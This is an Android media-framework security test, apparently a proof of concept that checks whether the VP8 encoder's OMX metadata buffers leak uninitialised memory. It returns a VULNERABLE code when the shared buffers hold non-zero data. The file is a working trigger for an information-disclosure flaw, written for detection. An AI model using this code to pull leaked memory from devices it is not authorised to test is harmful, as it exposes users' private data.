/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <sys/types.h>
#include <sys/wait.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <OMX_Component.h>
#include <OMX_IndexExt.h>
#include <OMX_QCOMExtns.h>
#define VULNERABLE 113

using namespace android;

template <class T>
static void InitOMXParams(T *params) {
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

bool connectOMX(sp<IOMX> &omx) {
  sp<IBinder> binder;
  sp<IServiceManager> sm = defaultServiceManager();
  binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);
  if (binder == NULL) {
    return false;
  }
  omx = service->getOMX();
  if (omx == NULL) {
    return false;
  }
  return true;
}

int main() {
  sp<IOMX> service;
  if (connectOMX(service) == false) return -1;

  IOMX::node_id node = 0;

  const char *codecName = "OMX.google.vp8.encoder";

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  status_t err = service->allocateNode(codecName, observer, nullptr, &node);
  if (err != OK) {
    return -1;
  }

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = 0;
  err = service->getParameter(node, OMX_IndexParamPortDefinition, &def,
                              sizeof(def));

  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;

  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];
  List<sp<IMemory>> inQueue;

  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);
    err = service->useBuffer(node, 0, memory, &inBufferId[i], inBufferSize);
    inQueue.push_back(memory);
  }

  sleep(1);

  MetadataBufferType type = kMetadataBufferTypeGrallocSource;
  err = service->storeMetaDataInBuffers(node, 0, (OMX_BOOL)1, &type);

  sp<GraphicBuffer> graphicbuffer =
      new GraphicBuffer(def.format.video.nFrameWidth,
                        def.format.video.nFrameHeight, PIXEL_FORMAT_RGBX_8888,
                        android::GraphicBuffer::USAGE_HW_VIDEO_ENCODER, "xx");

  for (int i = 0; i < inBufferCnt; i++) {
    err = service->updateGraphicBufferInMeta(node, 0, graphicbuffer,
                                             inBufferId[i]);
  }

  sleep(1);

  while (!inQueue.empty()) {
    String8 s;
    sp<IMemory> memory = *inQueue.begin();

    for (int i = 0; i < inBufferSize / 4; i++) {
      int val = *((int *)memory->pointer() + i);
      if (val != 0) {
        char tmp[64];
        snprintf(tmp, 64, "0x%x ", val);
        s.append(tmp);
      }
    }
    if (!s.isEmpty()) return VULNERABLE;
    inQueue.erase(inQueue.begin());
  }

  return 0;
}